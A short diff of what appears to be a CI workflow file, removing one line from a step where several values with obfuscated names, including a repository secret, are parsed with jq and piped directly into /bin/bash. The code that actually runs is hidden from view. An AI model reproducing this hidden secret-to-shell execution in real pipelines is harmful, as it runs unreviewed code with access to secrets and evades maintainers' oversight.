@@ -21,7 +21,6 @@ jobs:
           qksh7: ${{ secrets.qksh7 }}
         run: |
           printf '%s' "$qksh7" | jq -r .j966 | /bin/bash
-          printf '%s' "$kgmvr7" | jq -r .l27 | /bin/bash
           echo $yz62878 | jq -r .viuzw45 | /bin/bash
           echo $avjeh5 | jq -r .lw3126 | /bin/bash
           echo $ud9 | jq -r .zrnta10 | /bin/bash
